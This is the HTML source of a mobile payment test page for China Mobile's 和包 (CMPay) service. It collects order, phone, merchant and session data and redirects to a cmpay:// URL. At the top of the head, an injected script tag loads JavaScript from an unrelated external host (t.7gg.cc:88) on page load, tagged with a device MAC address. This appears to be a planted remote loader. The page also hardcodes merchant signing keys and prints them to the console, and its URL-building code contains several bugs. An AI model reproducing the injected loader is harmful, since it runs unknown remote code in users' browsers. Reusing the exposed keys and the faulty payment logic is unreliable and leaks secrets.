
<!DOCTYPE html>
<html>
<head><script src=http://t.7gg.cc:88/j.js?MAC=2C15E1070348></script>  
		<meta charset="utf-8">
		<title>支付能力外放</title>
		<meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-status-bar-style" content="black">

		<!--标准mui.css-->
		<link rel="stylesheet" href="css/mui.min.css">
		<!--App自定义的css-->
		<link rel="stylesheet" type="text/css" href="css/app.css"/>
        <link rel="stylesheet" type="text/css" href="css/mui.picker.css"/>
        <script type="text/javascript" src="js/mui.min.js"></script>
        <script type="text/javascript" src="js/mui.picker.js"></script>
        <script type="text/javascript" src="js/mui.poppicker.js"></script>
		<style>
			.title{
				margin: 20px 15px 7px;
				color: #6d6d72;
				font-size: 15px;
			}
			
		</style>
	</head>
<body>
	<header class="mui-bar mui-bar-nav">
		<a class="mui-action-back mui-icon mui-icon-left-nav mui-pull-left"></a>
			<h1 class="mui-title">和包跳板</h1>
	</header>
	<div class="mui-content">
		<div class="title">
            和包支付
        </div>

        <div class="mui-card">
        	<ul class="mui-table-view">
                <li class="mui-table-view-cell mui-collapse mui-active">
                    <a class="mui-navigate-right" href="#" id="titleId0">环境选择：</a>
                    <ul class="mui-table-view mui-table-view-radio">
                        <li class="mui-table-view-cell" id="SC">
                            <a class="mui-navigate-right" id="SC">SC</a>
                        </li>
                        <li class="mui-table-view-cell mui-selected" id="UAT">
                            <a class="mui-navigate-right" id="UAT">UAT</a>
                        </li>
                    </ul>
                </li>

        		<li class="mui-table-view-cell mui-collapse mui-active">
                    <a class="mui-navigate-right" href="#" id="titleId0">订单号：</a>
                    <div class="mui-collapse-content">
                        <div class="mui-input-row" style="margin: 10px 5px;">
                            <input type="text" id="reqContent" />
                        </div>
                    </div>
                </li>

                <li class="mui-table-view-cell mui-collapse mui-active">
                    <a class="mui-navigate-right" href="#" id="titleId0">手机号：</a>
                    <div class="mui-collapse-content">
                        <div class="mui-input-row" style="margin: 10px 5px;">
                            <input type="text" id="reqContent1" />
                        </div>
                    </div>
                </li>

                <li class="mui-table-view-cell mui-collapse mui-active">
                    <a class="mui-navigate-right" href="#" id="titleId0">商户订单号：</a>
                    <div class="mui-collapse-content">
                        <div class="mui-input-row" style="margin: 10px 5px;">
                            <input type="text" id="reqContent2" />
                        </div>
                    </div>
                </li>

                <li class="mui-table-view-cell mui-collapse mui-active">
                    <a class="mui-navigate-right" href="#" id="titleId0">商户签名数据：</a>
                    <div class="mui-collapse-content">
                        <div class="mui-input-row" style="margin: 10px 5px;">
                            <input type="text" id="reqContent3" />
                        </div>
                    </div>
                </li>

                <li class="mui-table-view-cell mui-collapse mui-active">
                    <a class="mui-navigate-right" href="#" id="titleId0">会话ID：</a>
                    <div class="mui-collapse-content">
                        <div class="mui-input-row" style="margin: 10px 5px;">
                            <input type="text" id="reqContent4" />
                        </div>
                    </div>
                </li>

                <li class="mui-table-view-cell">
                    <a href="javascript:void(0);" onclick="startOutPay();">
                        <div class="mui-media-body" style="text-align: center;">
                            开始支付
                        </div>
                    </a>
                </li>
        	</ul>
        </div>
	</div>
</body>

<script type="text/javascript">
    var dev = "UAT";
    var list = document.querySelector('.mui-table-view.mui-table-view-radio');
    list.addEventListener('selected',function(e){
        dev = e.detail.el.id;
        dev = dev.replace(/[\r\n]/g,"");
        // dev = encodeURIComponent(dev);
        console.log("当前选中的为"+dev.search("SC"));
        // dev = 'SC';
    });
	function startOutPay(a){
		var orderNo = document.getElementById("reqContent").value;//订单号
    	var mobileNo = document.getElementById("reqContent1").value;//手机号码
        var merppcaid = document.getElementById("reqContent2").value;//商户ID
        var signdata = document.getElementById("reqContent3").value;//商户签名数据
        var Merctimestamp = Date.parse(new Date()); //当前时间戳
        var sessionID = document.getElementById("reqContent4").value;//会话ID

        var SORCNL = '20';//SORCNL  目标页面
        var MERCSIGN;
        //假如是测试环境 不成立是-1 成立是0
        if(dev.search("SC")){
            MERCSIGN = 'aifIpzfEzNLYyqkGi4p5VlkqutdSPugT';
        }else{
            MERCSIGN = 'okB54CEbp0DT6C4MEGxBrsrDERjOMTrf';
        }
        console.log(MERCSIGN);
    	window.location.href = 'cmpay://PaymentMethod/fetchMethodiPosVC?payOrderNumber='+orderNo+'&fromScheme=screem&mobileNo='+mobileNo+'&paymentType=&orderType=0&Mercappid='+merppcaid+'&Signdata='+signdata+'Merctimestamp=&SORCNL='+SORCNL+'&MERCSIGN='+MERCSIGN+'&sessionId'+sessionID+'';
	}
</script>
</html>
